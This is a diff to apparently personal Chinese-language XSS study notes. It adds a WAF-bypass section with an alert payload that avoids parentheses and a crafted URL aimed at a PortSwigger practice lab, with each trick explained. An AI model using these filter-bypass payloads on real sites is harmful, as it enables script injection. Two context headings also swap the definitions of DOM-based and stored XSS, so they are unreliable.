@@ -226,5 +226,20 @@ payload:
 ```
 \';alert(1);//
 ```
+###### 绕过传参WAF
+`一些网站通过限制您可使用的字符来使 XSS 更加难以实现。这可以在网站级别进行，也可以通过部署 WAF 来阻止您的请求到达网站。在这些情况下，您需要尝试其他方法来调用绕过这些安全措施的函数。一种方法是使用带有异常处理程序的 throw 语句。这使您可以将参数传递给函数而无需使用括号。以下代码将 alert() 函数分配给全局异常处理程序，并且 throw 语句将 1 传递给异常处理程序（在本例中为 alert）。最终结果是使用 1 作为参数调用 alert() 函数。`<br/>
+#example:
+```
+onerror=alert;throw 1
+```
+```
+https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+1、&试图干扰后端逻辑：一些服务器可能直接解析 & 后的内容为另一个参数。
+2、throw他会顺序执行，并将最后一个值返回
+3、创建一个x函数是因为fetch API函数参数需要返回值
+4、因为过滤了()和空格，所以用/**/代替空格，同时使用toString内置函数来触发x函数
+5、window+''字符串拼接会触发toString(),然后触发x()
+```
 ### (2) DOM型XSS -- 恶意脚本来自网站的数据库
 ### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。
